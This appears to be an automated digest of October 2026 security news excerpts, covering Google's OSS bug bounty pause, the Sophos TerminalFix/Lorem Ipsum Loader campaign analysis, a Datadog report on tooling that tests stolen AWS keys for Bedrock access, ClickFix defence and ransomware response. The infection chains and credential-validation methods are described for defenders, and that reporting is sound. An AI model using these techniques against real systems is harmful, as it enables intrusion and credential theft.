Google Pauses OSS Product Bug Bounty Rewards After Surge in Invalid Automated Reports  Swati Khandelwal  Oct 06, 2026 Vulnerability / Open Source Google has stopped accepting product vulnerability reports through its bug bounty program for its open-source software. The change, in effect since October 1, means researchers can no longer submit security flaws in the code of projects such as Go, Angular, and Protocol Buffers there for a reward. Reports about supply chain compromises are still accepted, and reports filed before October 1 are not affected. Google called the stop temporary in a post on X on October 1 and said it was due to "a significant rise in automated submissions, the vast majority of which are not valid." The post gave no figures. It did not say whether the submissions were produced with AI tools. The rules of the program , called the Open Source Software Vulnerability Reward Program (OSS VRP), now carry a notice of the stop. It commits Google to an update in the first quarter of 2027 while it reworks this part of the program. Neither the post nor the notice gives a date for accepting product vulnerability reports again. Under the rules, a product vulnerability is a design or implementation flaw in Google's open source software. It must substantially affect the confidentiality or integrity of user data in software built with that code. Examples include memory corruption in file format parsers and path traversal. The program sorts projects into four tiers based on their sensitivity. Only the top two, called flagship and important, had rewards listed for product vulnerabilities. The same change that added the notice removed those listed amounts : $500 to $7,500 for flagship projects and $101 to $3,133.7 for important ones. It was published to Google's public GitHub copy of the rules on September 30, a day before the X post. Google's list of tiered repositories, last updated in mid-September, names 26 flagship repositories and 47 important ones. The flagship tier includes Go, Angular, Flutter, Bazel, and Protocol Buffers. Supply chain compromises, which are flaws that could let someone tamper with a project's source code or published packages, keep their listed rewards. So do other security issues, such as leaked credentials that give write access. Category Flagship Important Standard Supply chain compromises $3,133.7 to $31,337 $1,337 to $13,337 $500 to $3,133.7 Product vulnerabilities None (was $500 to $7,500) None (was $101 to $3,133.7) None Other security issues $1,000 $500 None The fourth tier, for low-priority projects, has no listed rewards. Where Reports Can Go Now Google's notice names three routes for researchers: Cloud VRP: Product vulnerability reports may still be accepted for some Google Cloud repositories that affect Google Cloud products, but the notice does not name them. Under the Cloud VRP rules , a flaw in an open source repository maintained by Google Cloud that affects Cloud products is rated at most IT3b. That is the tier for acquisitions and lower-priority products, and the cap applies unless Google's product list says otherwise. Patch rewards: The Patch Rewards Program pays $100 to $15,000 for security patches to the projects it covers, not for vulnerability reports. The project's maintainers must accept a patch and remain in place for one month before it can be submitted. A patch that fixes only a single vulnerability is reviewed on a case-by-case basis. Other reward programs: Google asks researchers to check whether a flaw affects something covered by one of its other reward programs and to submit it there. The OSS VRP rules also encourage reporting flaws in projects closely tied to Google Cloud or AI products to the Cloud VRP or the AI VRP. The notice does not say whether Google will still take product vulnerability reports without a reward. Some project policies point to other channels. Go takes security reports by email to its own security team. A security policy in Google's GitHub o
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Google Pauses OSS Product Bug Bounty Rewards After Surge in Invalid Automated Reports
  - Published: 2026-10-06T09:21:47+00:00
  - Link: https://thehackernews.com/2026/10/google-pauses-oss-product-bug-bounty.html
  - Summary: Google has stopped accepting product vulnerability reports through its bug bounty program for its open-source software. The change, in effect since October 1, means researchers can no longer submit security flaws in the code of projects such as Go, Angular, and Protocol Buffers there for a reward. Reports about supply chain compromises are still accepted, and reports filed before October 1 are

### Cluster a8065d8a20 — score 9

- Title: Connect Orca’s ChatGPT Plugin: Cloud Risk Context in Chat and Codex
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-09-30T15:00:00+00:00
- Link: https://orca.security/resources/blog/connect-orcas-chatgpt-plugin-cloud-risk-context-in-chat-and-codex/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- affected_products: AWS, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT, AWS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
What is the Orca Security plugin for ChatGPT and Codex? The Orca Security plugin for ChatGPT and Codex connects both tools to Orca’s MCP server, giving security teams and developers access to their Orca data where they already work. ChatGPT and Codex can pull alerts, assets, attack paths, effective permissions, and code origins from your […]
```

#### Full body

```
What is the Orca Security plugin for ChatGPT and Codex? The Orca Security plugin for ChatGPT and Codex connects both tools to Orca’s MCP server, giving security teams and developers access to their Orca data where they already work. ChatGPT and Codex can pull alerts, assets, attack paths, effective permissions, and code origins from your cloud environment, then use that context to answer security questions and write fixes. Why AI assistants need cloud risk context Most security questions still get answered the slow way. An engineer asks “are we exposed to this CVE?”, and someone on the security team logs into a console, builds a query, exports a CSV, and pastes the answer back into chat an hour later. Meanwhile, security practitioners have transformed their workflows from AI prompting to building agents that automate repeatable work. Security teams draft reports and investigations in ChatGPT. Developers ship code with Codex. The coding agent is where the work happens, but it has no idea what is actually running in your cloud. A general-purpose model can explain what a CVE is. It cannot tell you which of your thousands of assets carry it, which ones are internet-facing, or which one sits two hops from a production database. Today, that changes. The Orca Security plugin is now available in the ChatGPT and Codex plugin directory, bringing Orca’s risk context into both products. How the Orca plugin works: MCP server plus the Unified Data Model The plugin connects ChatGPT and Codex to Orca’s MCP server . That server exposes Orca’s data as tools the model can call on its own: alerts, assets, attack paths, effective permissions, code origins, and Orca’s documentation. The important part is what sits behind those tools. Every asset, alert, identity, and dependency is already correlated in Orca’s Unified Data Model before anyone types a prompt. So when ChatGPT answers, it is not reasoning over a raw list of findings. It is reasoning over findings that already carry reachability, blast radius, and business impact. Big idea: The model brings the reasoning. Orca brings the context. Tools the Orca MCP server exposes to ChatGPT and Codex include: Tool What it returns discovery_search Results for a plain-language search across your environment, plus a link to see them in Orca get_alert / get_alert_attack_path_data Full alert details and the attack path behind it get_asset_by_id / get_asset_by_name Asset details and context get_aws_effective_permissions_policy_on_asset What an AWS identity can actually do, not just what its policy says get_alerts_with_similar_malware / get_other_secret_occurrences Whether one finding is part of a wider pattern get_code_origin / get_terraform_chain The repository and Terraform chain behind a cloud asset update_alert_status Moves an alert to open, in progress, or resolved documentation_search Answers from Orca’s product docs Some answers are too big for text. For alerts, ChatGPT renders an interactive Orca card instead of a paragraph, so you can read the risk and act on it without switching tabs. Orca adds tools continuously, so treat this as a sample, not the full list. For teams that want repeatable workflows without writing prompts, Orca also maintains the AI Skills Hub , an open-source repo of agent skills such as orca-alert-triage that teams can fork and extend. 6 ways security teams use Orca in ChatGPT The pattern is the same in every scenario below. You describe the goal, and ChatGPT decides which Orca tools to call, in what order, and how to stitch the results together. You do not need to know tool names or query syntax. 1. Find what is exposed right now Scenario: A new security lead wants to know where the real risk sits on day one. @Orca Security show the most critical internet-exposed risks in my AWS environment ChatGPT runs a discovery search for internet-facing assets with critical findings, then ranks them by Orca’s risk score instead of raw CVSS. The answer ends with a link into the Orca app for
```

#### Corroborating sources (3)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Connect Orca’s ChatGPT Plugin: Cloud Risk Context in Chat and Codex
  - Published: 2026-09-30T15:00:00+00:00
  - Link: https://orca.security/resources/blog/connect-orcas-chatgpt-plugin-cloud-risk-context-in-chat-and-codex/
  - Summary: What is the Orca Security plugin for ChatGPT and Codex? The Orca Security plugin for ChatGPT and Codex connects both tools to Orca’s MCP server, giving security teams and developers access to their Orca data where they already work. ChatGPT and Codex can pull alerts, assets, attack paths, effective permissions, and code origins from your […]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Wikimedia Says OpenAI Agents Tried to Compromise Etherpad and Use Wiki Tools as Proxies
  - Published: 2026-10-06T11:26:25+00:00
  - Link: https://thehackernews.com/2026/10/wikimedia-says-openai-agents-tried-to.html
  - Summary: The Wikimedia Foundation, which hosts Wikipedia, has confirmed that it has discovered activity by rogue OpenAI agents on its platforms, including unsuccessful efforts to compromise Etherpad, a public note-taking tool, and edit Wikipedia pages. "The unauthorized bot activities included edits to our wikis, some unsuccessful attempts to exploit a public note-taking tool we host, and heavy traffic,
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: OpenAI reveals ‘novel’ encryption bypass used in distillation attack
  - Published: 2026-09-30T22:17:34+00:00
  - Link: https://cyberscoop.com/openai-moonshot-ai-model-distillation-attack/
  - Summary: The company said individuals associated with Chinese company MoonshotAI were behind parts of the attack, but did not offer hard evidence for the claim. The post OpenAI reveals ‘novel’ encryption bypass used in distillation attack appeared first on CyberScoop .

### Cluster aee89b0f66 — score 8

- Title: TerminalFix and Lorem Ipsum Loader enable covert tunneling
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-30T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/terminalfix-and-lorem-ipsum-loader-enable-covert-tunneling
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The activity is linked to a broader campaign that previously used a different delivery mechanism Categories: Threat Research Tags: TerminalFix, clickfix, Lorem Ipsum Loader
```

#### Full body

```
TerminalFix and Lorem Ipsum Loader enable covert tunneling The activity is linked to a broader campaign that previously used a different delivery mechanism Written by Jordon Olness , Morgan Demboski Threat Research TerminalFix clickfix Lorem Ipsum Loader Share This Link Copied In August 2026, Sophos analysts began investigating a series of Managed Detection and Response (MDR) cases that involved ClickFix-style lures and resulted in the deployment of a Python-based tunneling implant. Instead of a typical ClickFix lure that instructs victims to open the Run dialog box, these lures direct users to open a Windows Terminal window. This ClickFix variation is known as ‘TerminalFix’. TerminalFix is not linked to a specific threat group or a single campaign. In 2026, Sophos analysts have observed several malicious campaigns that incorporated these lures (see Figure 1) and resulted in multiple infection chains. Figure 1: TerminalFix lures While investigating this activity, Sophos analysts identified the deployment of Lorem Ipsum Loader, a shellcode-based loader first observed by BlueVoyant in February 2026. The presence of this malware, combined with the command and control (C2) infrastructure, persistence techniques, and DLL sideloading activity, enabled Sophos analysts to link the TerminalFix intrusions to a broader campaign that has been active since at least March. Sophos analysts track this campaign as STAC4924. STAC4924 infection chain By following the instructions in the TerminalFix lure, victims execute a PowerShell command that downloads a ZIP archive containing a legitimate Windows executable, a malicious DLL, and a batch script (see Figure 2). Figure 2: Contents of the downloaded ZIP archive The command then executes the batch script, which installs several persistence mechanisms and launches the legitimate LockScreenContentServer.exe binary. The executable loads the malicious dui70.dll file via DLL sideloading. This DLL contains and executes Lorem Ipsum Loader. This loader attempts to evade entropy-based detections by storing shellcode bytes as English words rather than raw binary data. A separate lookup table provides a mapping between those words and the hexadecimal byte values they represent. Once executed, Lorem Ipsum Loader issues an HTTP request to an attacker-controlled profile hosted on the legitimate Letsdiskuss platform. The loader extracts an encoded string embedded within the profile and decodes it to retrieve the current set of C2 servers. The loader then communicates with the C2 servers using HTTP POST requests that appear to contain JPEG image files (see Figure 3). However, the image files contain encoded data that the malware extracts and decodes to facilitate C2 communications.; Figure 3: Sample image passed between the malware and C2 server The malware then executes a series of PowerShell commands to conduct reconnaissance, gather information, and establish persistence. It deploys a portable Python runtime to the Users\Public\indigo directory by downloading the legitimate Python embedded package from python.org and extracting it alongside malicious files. The runtime is then used to execute client.py, a custom tunneling implant that establishes an encrypted WebSocket connection to attacker-controlled servers and assigns a unique UUID to identify the compromised host. The resulting tunnel enables the threat actors to relay traffic through the compromised host and access network resources while blending in with legitimate web traffic. Two phases, two delivery mechanisms Analysis of the STAC4924 campaign revealed two distinct phases of activity that employ different delivery mechanisms but share many technical characteristics. The first phase, observed in March and April, relied on SEO-poisoned websites distributing trojanized Microsoft Teams MSI installers. These installers deployed a multi-stage PowerShell loader that communicated with victim-specific C2 infrastructure and leveraged attacker-controlled profi
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: TerminalFix and Lorem Ipsum Loader enable covert tunneling
  - Published: 2026-09-30T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/terminalfix-and-lorem-ipsum-loader-enable-covert-tunneling
  - Summary: The activity is linked to a broader campaign that previously used a different delivery mechanism Categories: Threat Research Tags: TerminalFix, clickfix, Lorem Ipsum Loader

### Cluster 82a8a896d6 — score 8

- Title: Beyond valid credentials: How exposed AWS keys are tested for Amazon Bedrock access
- Source: Datadog Security Labs (cloud_identity_infrastructure)
- Published: 2026-10-06T00:00:00+00:00
- Link: https://securitylabs.datadoghq.com/articles/beyond-valid-credentials-how-exposed-aws-keys-are-tested-for-amazon-bedrock-access/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: retail_ecommerce
- affected_products: AWS
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: retail_ecommerce
- affected_products: AWS
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
In this post, we share LLM-specific validation patterns that attackers use to test exposed AWS credentials for Amazon Bedrock access.
```

#### Full body

```
Martin McCloskey Staff Security Engineer Not all credentials are created equal. An attacker who gains access to credentials usually performs validation to determine how useful each set of captured credentials actually is. For years, this has been true for the AWS SES/SNS services . Attackers use API calls like GetSendQuota , GetSMSAttributes , and GetSMSSandboxAccountStatus to assess whether an account is in a production or sandbox environment and then to assess the sending limits attached to that account. The usefulness of the credentials affects their resale value. Attackers use similar tactics when targeting LLM resources in AWS. In this post, we will share LLM-specific validation patterns that we have observed after finding multiple credential harvesting platforms. The value attached to LLM-capable credentials is not merely theoretical. Unit 42 recently shared some research about token-jacking , where third parties run transfer stations that proxy access to commercial AI models and sell that capacity below retail price. Services like these depend on legitimate credentials that can be stolen, rotated, and shared across users. This demonstrates that there is a viable market for stolen credentials outside of a threat actor using them solely for their own purpose. Credential validation tooling observed in the wild We've observed several tools and platforms that validate stolen AWS credentials by testing not only whether they are active but also whether they can discover and invoke Amazon Bedrock models. KMON_NOC KMON_NOC is a credential harvesting platform that we have observed targeting customers since August 31, 2026. We have identified hosts associated with this platform scanning and probing for credentials in over 80 Datadog Cloud SIEM customers. The KMON_NOC portal login page, which requires an access password. (click to enlarge) Though we were unable to gain access to KMON_NOCâs validation logic or observe AWS API activity from KMON_NOCâs infrastructure, we analyzed a publicly accessible JavaScript bundle loaded by the KMON_NOC portal. The frontend code contains dedicated fields, filters, statistics, and interface elements for identifying and managing credentials with Bedrock access. These fields indicate that the platform treats Bedrock as a distinct credential capability. Frontend code snippets The frontend code states that AWS access key pairs are first validated by using the AWS Security Token Service (STS) GetCallerIdentity API with Signature Version 4 signing. Valid credentials then undergo a separate check for Bedrock access, allowing KMON_NOC to distinguish general-purpose AWS credentials from those that can access Bedrock resources. < li > AWS : uses < span className = "text-orange-400" > STS GetCallerIdentity < / span > with SigV4 signing ( requires proxy ) < / li > < li > AWS valid keys also check for < span className = "text-orange-400" > Amazon Bedrock access < / span > < / li > This distinction is carried into the platformâs data model and dashboard. The keysWithBedrock field is used to generate BEDROCK and BEDROCK ACCESS statistics which are displayed prominently within the platform, indicating the level of importance assigned to AWS credentials with access to Bedrock. const bedrockTotal = servers . reduce ( ( total , server ) => total + ( server . stats ?. keysWithBedrock ?? 0 ) , 0 ) ; ... { label : "BEDROCK ACCESS" , value : format ( bedrockTotal ) , color : "text-orange-400" } ... [ { label : "TOTAL" , value : format ( stats ?. keysFound ?? 0 ) } , { label : "VALID" , value : format ( stats ?. keysValid ?? 0 ) } , { label : "BEDROCK" , value : format ( stats ?. keysWithBedrock ?? 0 ) , color : "text-orange-400" } ] KMON_NOC also extracts and displays AWS_BEARER_TOKEN_BEDROCK , the environment variable used for Amazon Bedrock API keys. These bearer tokens are scoped to Bedrock operations. The interface provides dedicated controls to reveal and copy the token, showing that its interest extends beyo
```

#### Corroborating sources (1)

- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: Beyond valid credentials: How exposed AWS keys are tested for Amazon Bedrock access
  - Published: 2026-10-06T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/beyond-valid-credentials-how-exposed-aws-keys-are-tested-for-amazon-bedrock-access/
  - Summary: In this post, we share LLM-specific validation patterns that attackers use to test exposed AWS credentials for Amazon Bedrock access.

### Cluster 037cb026da — score 8

- Title: AWS Continuum sets a new standard in autonomous code security
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-10-05T21:41:01+00:00
- Link: https://aws.amazon.com/blogs/security/aws-continuum-sets-a-new-standard-in-autonomous-code-security/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
As AI models become more capable, they uncover more security vulnerabilities and identify increasingly sophisticated paths to exploit them, raising the bar for how quickly defenders must respond. Security teams now face more potential vulnerabilities than their existing processes were designed to handle — each requiring investigation, reproduction, and a repair that must be tested […]
```

#### Full body

```
AWS Security Blog AWS Continuum sets a new standard in autonomous code security As AI models become more capable, they uncover more security vulnerabilities and identify increasingly sophisticated paths to exploit them, raising the bar for how quickly defenders must respond. Security teams now face more potential vulnerabilities than their existing processes were designed to handle — each requiring investigation, reproduction, and a repair that must be tested to confirm it closes the vulnerability without breaking expected behavior. AWS Continuum for code vulnerabilities accelerates this work with autonomous security at machine speed. To measure Continuum against a concrete public standard, we chose CyberGym-E2E , which asks an agent to find a vulnerability in a real codebase, demonstrate it with a working proof of concept, and repair it without breaking behavior covered by the project’s tests. Continuum passed 819 of 920 tasks within the benchmark’s 90-minute limit, achieving an 89.0% end-to-end success rate. This establishes a new standard 23.1 percentage points up from the previous public high of 65.9%. Measuring the full vulnerability lifecycle Many security benchmarks test a single task in isolation. Detection benchmarks test whether a system can identify suspicious code, while patching benchmarks begin with a known flaw and ask for a fix. CyberGym, the predecessor to CyberGym-E2E, also begins with a known vulnerability and focuses on exploit generation. By contrast, CyberGym-E2E evaluates the full vulnerability lifecycle, requiring a system to identify and demonstrate a vulnerability before producing a tested repair. This broader scope more closely reflects the work facing security teams. Each CyberGym-E2E task places an agent in a container with a vulnerable revision of a real open-source project and the tools needed to build and test it. An agent can inspect and modify the source, but receives no vulnerability description, proof of concept, crash log, or original patch. External network access is blocked, and protected benchmark files cannot be modified. Within 90 minutes, the agent must submit an input demonstrating a vulnerability and a source-code patch. The full benchmark contains 920 tasks based on historical OSS-Fuzz vulnerabilities across 139 open-source projects. The median project contains more than 600,000 lines of code. The benchmark evaluates each submission in four cumulative stages: S1 checks whether the agent produced an input that crashes the vulnerable program. S2 checks whether the agent’s patch prevents that crash. S3 checks whether the patched project still passes its functionality tests. S4 checks whether the patch also fixes the specific historical vulnerability selected by the benchmark. CyberGym-E2E defines S3 as its main measure of end-to-end success. S4 is diagnostic because a repository may contain several valid vulnerabilities: an agent can find and repair a real flaw that differs from the benchmark’s selected target. Continuum sets a new standard Continuum for code vulnerabilities reached a new standard for every stage of CyberGym-E2E. The table below compares its performance with the previous best public results. Stage What it measures Continuum Previous public high Difference S1 Finds and reproduces a vulnerability 92.5% 67.9% +24.6% S2 Repairs its generated crash 89.6% 66.2% +23.4% S3 Preserves tested functionality 89.0% 65.9% +23.1% S4 Also repairs the benchmark’s selected vulnerability 37.8% 26.2% +11.6% On S3, the benchmark’s main measure of end-to-end success, Continuum passed 819 of 920 tasks. Its 89.0% success rate exceeds the previous public high of 65.9% by 23.1 percentage points. The result reflects both the capability of the underlying frontier models and Continuum’s design as a multi-agent security system. The next section examines how that system adds value beyond the models alone. The official 89.0% result applies CyberGym-E2E’s 90-minute limit. When tasks were allowed to co
```

#### Corroborating sources (1)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: AWS Continuum sets a new standard in autonomous code security
  - Published: 2026-10-05T21:41:01+00:00
  - Link: https://aws.amazon.com/blogs/security/aws-continuum-sets-a-new-standard-in-autonomous-code-security/
  - Summary: As AI models become more capable, they uncover more security vulnerabilities and identify increasingly sophisticated paths to exploit them, raising the bar for how quickly defenders must respond. Security teams now face more potential vulnerabilities than their existing processes were designed to handle — each requiring investigation, reproduction, and a repair that must be tested […]

### Cluster 138a173946 — score 8

- Title: How Huntress Detects and Responds to a ClickFix Attack
- Source: Huntress (detection_response_operations)
- Published: 2026-10-05T14:00:00+00:00
- Link: https://www.huntress.com/blog/fix-for-clickfix
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
ClickFix attacks leave no file to scan or block, which is why most endpoint tools miss it. See how Huntress Attack Disruption kills the chain in under a second.
```

#### Full body

```
Home Blog The Fix for ClickFix: How Huntress Detects and Responds to a ClickFix Attack Published: October 5, 2026 The Fix for ClickFix: How Huntress Detects and Responds to a ClickFix Attack By: Shivangi Pandey Jonathan Semon Summarize with AI Summarize ChatGPT Claude Perplexity Google AI If you're reading this, you probably don't need the ClickFix explainer. You've seen the fake CAPTCHA. You know a user is going to press Windows+R and paste something eventually. You may have already had the call. The question you're actually asking is harder: why didn't the tools you're already paying for stop the attack? What will actually work? That's a fair question, and the answer is uncomfortable. ClickFix doesn't beat endpoint security through sophistication. It beats it by not tripping any of the conditions that endpoint security is built around. The structural problem: there is typically nothing to block Nearly every endpoint control in the market, whether that's signature-based AV, next-gen AV, or most EDR, is built on a shared assumption. Something arrives. A macro-laden document, an unsigned binary in the temp folder, a malicious attachment, an exploit against an unpatched service. There's an artifact , and the job is to catch it on the way in. ClickFix doesn't always give you that artifact. The victim lands on a page telling them to prove they're human. They hit Windows+R. They paste a command they've been handed. They press Enter. That's the entire delivery mechanism. Usually, no dropper. No attachment. No exploit. No file on disk to hash, scan, or quarantine. From the endpoint's perspective, a user launching a program is the most ordinary thing they do all day. This is why the failure is a category problem, not a vendor problem. If your evaluation criteria are built around detonation, file reputation, or artifact analysis, ClickFix isn't a gap in your coverage; it's outside the coverage model entirely. A useful gut check: ask whoever you're currently paying what, specifically, they match on when there is no file. If the answer routes back to "we'd catch stage two," you already know what that costs. Because you will catch stage two. That's the second half of the problem. Catching it isn't the problem. Catching it in time is. Detection built on backend telemetry works. Ours does: our Detection Engineering team's alerting fires reliably on ClickFix. But it fires downstream , after execution. Telemetry ships, gets indexed, correlates, produces an alert, and an analyst picks it up. ClickFix chains move from stage one to stage two to stage three in mere seconds. So by the time any downstream system produces a verdict, the cradle (the few lines of script whose only job is to fetch the real payload and run it) has already had its opportunity to pull the payload. The infostealer already ran. The credentials are already gone. The rogue RMM is already installed. Your analyst or security provider isn't intervening in an attack. They're doing incident response on one that finished. That gap between "we detected it" and "we stopped it" is the entire ballgame with this technique, and it's the thing most evaluations never actually test. What stops ClickFix Three requirements follow from the above. They're worth applying to any vendor you're evaluating, including us. 1. It has to match the shape, not the artifact. If there's no file, the only thing left to match is the command itself: its structure, its obfuscation, its context. That means behavioral matching on command lines and process relationships, not reputation or detonation. 2. The decision has to happen on the endpoint, in milliseconds. Any architecture that requires a round trip to a backend has already lost to a chain that completes in seconds (if you are lucky). This is an architectural constraint, not a tuning problem; you can't configure your way out of network latency. 3. It has to be safe enough to leave on. A control aggressive enough to kill user-launched processes can break pro
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: How Huntress Detects and Responds to a ClickFix Attack
  - Published: 2026-10-05T14:00:00+00:00
  - Link: https://www.huntress.com/blog/fix-for-clickfix
  - Summary: ClickFix attacks leave no file to scan or block, which is why most endpoint tools miss it. See how Huntress Attack Disruption kills the chain in under a second.

### Cluster 9426a5a9e7 — score 8

- Title: The First 24 Hours: What Happens When Ransomware Lands
- Source: Huntress (detection_response_operations)
- Published: 2026-10-02T16:00:00+00:00
- Link: https://www.huntress.com/blog/what-happens-during-a-ransomware-attack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: financial_services, retail_ecommerce
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: financial_services, retail_ecommerce
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Nazar Tymoshyk from UnderDefense shares his thoughts on what ransomware attacks look like during the all-important opening hours.
```

#### Full body

```
Home Blog The First 24 Hours: What Actually Happens When Ransomware Lands Published: October 2, 2026 The First 24 Hours: What Actually Happens When Ransomware Lands By: Nazar Tymoshyk Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key takeaways: Encryption is the last step of the intrusion. Mandiant's M-Trends 2026 puts the global median dwell time at 14 days, so hour zero for you is usually week two for them. Assume the data left before the files are locked. CISA's Akira advisory records cases where exfiltration was complete two hours after the attacker got in. Restore something from a backup before anyone gives the board a recovery time. Ransomware crews now hunt backup infrastructure on purpose. Most first-day failures are decision failures. The technical steps are written down somewhere. The authority to take them usually is not. The first report rarely comes from a detection rule. It comes from a shift supervisor who can't open the production schedule, or from a finance clerk who found a text file on the shared drive with payment instructions in it. By the time that call reaches you, the part of the attack you can still influence has already started. What follows is the shape of a first day, hour by hour, as I have watched it run in ransomware engagements across food production, business services and retail. The hour markers are approximate. The order is not. Hour 0: The clock started long before you noticed The most useful thing to establish in the first ten minutes is when this began, and the answer is almost never today. Mandiant's M-Trends 2026, published in March 2026 and built on over 500,000 hours of frontline investigations, reports global median dwell time rose to 14 days from 11. A second finding in that report changes how you scope the day. In 2022, the median gap between an initial access event and the hand-off to a second threat group was more than eight hours. By 2025 it had collapsed to 22 seconds. The practical consequence: the crew encrypting your files is often not the crew that broke in. You are reconstructing two sets of activity with different tooling and different goals, and the quiet one came first. Hours 0 to 1: Confirm it before you say the word Saying "ransomware" out loud starts a chain of calls you can't unmake, so the first hour buys certainty. Check whether the ransom note sits on more than one host, whether a file extension changed across a share or only on one workstation, and whether your endpoint detection and response (EDR) shows mass file modification by a single process. A failed backup job and a broken sync client both look like this from a help desk ticket, and calling it wrong costs you credibility you'll need later. Getting it wrong in the other direction costs more. In one engagement UnderDefense's responders were called into, the ransomware had already reached 22 hypervisors by the time anyone picked up the phone. The signal had arrived as a handful of unremarkable alerts spread across a week. So scope by blast radius: one endpoint, a file share, a domain controller, the virtualization layer. Each step up that list closes off decisions in the next section. Hours one to two: Containment choices you can't take back Hour one decides most of the rest. Every containment action buys something and destroys something, and the trade is rarely written anywhere your night-shift engineer can find at 03:00. Action What it stops What it costs you Choose it when Network-isolate the host from the EDR console Lateral movement and command-and-control from that host Your own remote access, unless you hold an allowlist open The host still runs an agent you control Pull the cable The same, on a host with no agent Remote access, with no allowlist option There's no agent and someone can reach it physically Power the host off Encryption still running on that disk Memory, which often holds the injected process, the operator's tooling and sometimes key material Files are actively encrypti
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: The First 24 Hours: What Happens When Ransomware Lands
  - Published: 2026-10-02T16:00:00+00:00
  - Link: https://www.huntress.com/blog/what-happens-during-a-ransomware-attack
  - Summary: Nazar Tymoshyk from UnderDefense shares his thoughts on what ransomware attacks look like during the all-important opening hours.

### Cluster 5b0efacecb — score 8

- Title: New Huntress View for Security Incident Investigations
- Source: Huntress (detection_response_operations)
- Published: 2026-10-01T21:00:00+00:00
- Link: https://www.huntress.com/blog/security-incident-investigations-partner-view
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
See how the Huntress SOC runs security incident investigations from first signal to final resolution, including the ones closed as benign.
```

#### Full body

```
Home Blog New Investigations View: From Black Box to Glass Box Last Updated: October 1, 2026 New Investigations View: From Black Box to Glass Box By: Micah Neidhart Summarize with AI Summarize ChatGPT Claude Perplexity Google AI For a long time, partners have told us the same thing: when an investigation was closed as benign, it was hard to know what actually happened behind the scenes. You might see that our Security Operations Center ( SOC ) looked at something and decided it was not a threat, but not much about why . That lack of visibility made a few things harder than they needed to be: Explaining to end customers what Huntress actually did or didn't do Showing the value of investigations that feel like a black box Answering reasonable questions like, "What did your analysts find?" The new Investigations View is our answer. It's a single place where you can see every investigation, what triggered it, and exactly how it was handled. Including those "closed benign." Prefer to watch? Robert Knapp, Director of the Huntress Security Operations Center, walks through the Investigations View, including the timeline of every step an attacker took and every step the SOC took in response, even for investigations closed as benign. New: Chronological timeline of security incident investigations Let's jump to the most exciting part first: you can now drill into any investigation to see a detailed, chronological timeline of everything that took place from first signal to final resolution. And you can easily export this information as a PDF to share with stakeholders. The investigation timeline includes: Signals that led to the investigation Analyst notes and context Incident reports, if one was generated Recommended and completed remediations Final resolution and status The investigation details view shows a full, ordered timeline of every signal, analyst action, and decision. This view turns what used to be a black box into a glass box: partners can see not just the outcome, but the work the Huntress SOC performed to get there. Even for investigations that determine activity is benign. Redesigned: A dashboard for every investigation Ok, let's zoom out from the details a little. Where do you find these delightful investigation timelines? When malicious activity is detected, they are now included by default in all Incident Reports. But you can also see the full list of investigation summaries in one place if you head over to the redesigned Investigations Dashboard. Here's how: Sign in to the Huntress portal Navigate to the Investigations tab in the top navigation Use the search and filters to find the investigations you care about most At the top of the dashboard, you'll find some high-level KPIs, including how many investigations were closed or reported, the organizations within your account that saw the most investigations, top signal types, and more. Below that, you'll also find a row-by-row view of everything our SOC has investigated across your tenants. Review the 